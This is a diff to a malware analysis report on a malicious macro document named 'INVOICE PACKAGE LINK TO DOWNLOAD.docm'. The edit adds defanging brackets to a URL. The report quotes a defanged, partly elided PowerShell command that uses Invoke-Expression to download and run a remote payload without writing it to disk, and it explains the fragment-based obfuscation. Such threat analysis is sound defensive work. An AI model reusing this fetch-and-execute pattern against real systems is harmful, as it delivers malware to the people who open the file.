@@ -69,7 +69,7 @@ The file **INVOICE PACKAGE LINK TO DOWNLOAD.docm** was identified as malicious b
 
 When the document is opened, the AutoOpen macro is launched, which executes a **PowerShell** command. The script calls the command:
 
-*pwsh[.]exe -Command "EX ( ... ).Invoke('hxxps[:]//filetransfer[.]io/data-package/UR2whuBw/download
+*pwsh[.]exe -Command "EX ( ... ).Invoke('hxxps[:]//filetransfer[.]io[/]data-package[/]UR2whuBw[/]download
 ')"*
 
 The alias EX stands for *Invoke-Expression*, a function used to execute the passed code. **PowerShell** connects to the specified URL, downloads the remote payload, and runs it without saving the file to disk, which is known as fileless execution. Additionally, the code is obfuscated by dividing it into fragments and connecting them with “+” characters, which is a typical technique used to make detection by security systems more difficult.
